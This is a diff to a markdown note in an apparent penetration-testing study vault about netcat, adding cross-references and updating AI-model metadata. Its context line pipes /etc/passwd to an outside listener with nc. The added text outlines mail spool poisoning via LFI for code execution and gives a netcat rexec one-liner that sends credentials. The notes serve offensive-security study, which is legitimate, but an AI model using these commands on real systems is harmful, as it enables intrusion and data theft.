@@ -160,6 +160,12 @@ cat /etc/passwd | nc 10.10.14.5 9005
 
 ---
 
+> [!note] **See also**
+> Services this tool is used against in this vault: [[Services/Email/SMTP|SMTP]] — raw protocol interaction and **mail spool poisoning** (deliver a PHP body to a local user, then include `/var/mail/<user>` via an LFI); [[Services/Remote Access/R-Services|R-Services]] — banner-grabbing 512–514, and a manual `rexec` substitute (`printf '0\0user\0pass\0id\0' | nc <target> 512`) since Kali ships no rexec client.
+> Related: [[Tools/File Transfer/netcat|netcat (file-transfer angle)]] — same tool, documented from the exfil/transfer side.
+
+---
+
 *Created: 2026-03-13*
-*Updated: 2026-03-13*
-*Model: claude-sonnet-4-6*
+*Updated: 2026-08-13*
+*Model: claude-opus-5*
